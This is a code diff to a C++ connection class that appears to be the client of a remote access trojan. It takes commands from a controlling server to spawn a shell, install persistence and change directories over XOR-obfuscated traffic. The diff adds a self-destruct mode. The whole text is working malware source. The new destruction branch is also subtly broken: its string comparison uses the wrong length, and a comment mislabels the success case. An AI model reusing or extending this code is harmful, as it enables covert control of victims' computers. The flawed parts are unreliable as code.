@@ -49,11 +49,11 @@ int Connexion::openConnexion()
 }
 
 
-int Connexion::main(bool is_admin, string path_prog)
+int Connexion::main()
 {   
 
     //int i=0;
-    string command;
+    string command,status;
     vector <string> result;
 
     int len_recv=0;    
@@ -86,7 +86,7 @@ int Connexion::main(bool is_admin, string path_prog)
             }
             else if(command.substr(0,2)=="cd")
             {
-            ////cout << "Change directory" <<endl;
+            //Change directory
                 if(changeDirectory(command))
                 {
                     result.push_back("Error when changing folder.");
@@ -95,7 +95,6 @@ int Connexion::main(bool is_admin, string path_prog)
                 {
                     result.push_back(getPath());   
                 }
-                //send(sock_client,result.c_str(),strlen(result.c_str()),0);
                 sendSafe(result);
             }
             else if(command.substr(0,16) == "MOD_SPAWN_SHELL:")
@@ -125,7 +124,7 @@ int Connexion::main(bool is_admin, string path_prog)
             else if (command.substr(0,23) =="MOD_LONELY_PERSISTENCE:")  
             {
                 //In mod persistence.
-                Persistence persistence(is_admin, path_prog);
+                Persistence persistence(a_is_admin, a_path_prog);
 
                 if(command.substr(23,command.length()) =="default")
                 {
@@ -133,6 +132,28 @@ int Connexion::main(bool is_admin, string path_prog)
                     persistence.main();
                 }
                 int satt = send(sock_client , XOREncryption("\r\n").c_str() ,2 ,0);
+            }
+            
+            else if (command.substr(0, 15)  == "MOD_DESTRUCTION:")
+            {
+                cout << "MOD DESTRUCTION !" << endl;
+
+                if(totalDestruction(a_path_prog) == 0)
+                {
+                    //If error
+                    status = "[+] The destruction mode is executed successfully.";
+                }
+                else
+                {
+                    status = "[-] An error occurred while executing the destroy mode.";
+                }
+
+                send(sock_client, status.c_str(), status.length(),0); //Send the statue to the server. The server will just display the status.
+                cout << "send status" << endl;
+                cout << "bye... " << endl;
+                Sleep(2000);
+                exit(0);
+                
             }
             else
             {
@@ -173,7 +194,6 @@ string Connexion::recvSafe()
     else
     {
         result.append(buffer,len_recv);
-        //command.append(XORData);
         
         if(result.empty())
         {
@@ -280,6 +300,8 @@ void Connexion::reConnect()
 }
 
 
+
+
 int Connexion::getSocket()
 {
     return sock_client;
@@ -305,3 +327,23 @@ void Connexion::setToken(string token)
     }
     
 }
+
+
+void Connexion::setIsAdmin(bool is_admin)
+{
+    if(is_admin)
+    {
+        a_is_admin = true; //is admin
+    }
+    else
+    {
+        a_is_admin = false; //is not admin
+    }
+}
+
+
+void Connexion::setPathProg(string path_prog)
+{
+    a_path_prog = path_prog;
+}
+
